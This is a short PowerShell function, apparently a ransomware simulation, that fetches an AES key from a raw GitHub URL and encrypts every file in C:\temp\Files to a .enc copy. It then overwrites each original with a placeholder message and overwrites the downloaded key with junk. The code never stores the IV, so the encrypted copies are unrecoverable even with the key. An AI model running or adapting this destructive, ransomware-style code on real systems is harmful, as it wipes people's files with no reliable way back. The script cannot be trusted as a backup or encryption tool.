function Encrypt-File {
    [CmdletBinding()]
    param (
      [Parameter(Mandatory = $true)]
      [string] $source="C:\temp\Files"
      # Path to the resulting encrypted file
    )
    $AES = [System.Security.Cryptography.AesManaged]::new()

    mkdir -Path C:\temp -ErrorAction SilentlyContinue
    Invoke-WebRequest -Uri https://raw.githubusercontent.com/krunoslav-mihalic/AzureBackup/main/key.txt -OutFile c:\Temp\key.txt
    $AES.Key = Get-Content -AsByteStream -Path c:\Temp\key.txt

    $Encryptor = $AES.CreateEncryptor()

    Write-Verbose -Message 'Reading source file'

    Get-ChildItem -Path $source | ForEach-Object {

        $path = $_

        $FileStream = [System.IO.FileStream]::new($Path, [System.IO.FileMode]::OpenOrCreate)
        $FileWriter = [System.IO.File]::OpenWrite($_.FullName + ".enc")

        $CryptoStream = [System.Security.Cryptography.CryptoStream]::new($FileWriter, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        Write-Verbose -Message 'Created CryptoStream'

        $FileStream.CopyTo($CryptoStream)

        Write-Verbose -Message 'Finished writing bytes to CryptoStream'
     
        $CryptoStream.Flush()
        $CryptoStream.FlushFinalBlock()
        $FileWriter.Flush()
        $CryptoStream.Clear()
        $FileWriter.Close()
        $FileStream.Close()

        "File has been encrypted" | Out-File -FilePath $_ -Force

    }

    "123456789012345678901234567890" | Out-File -FilePath c:\Temp\key.txt
}
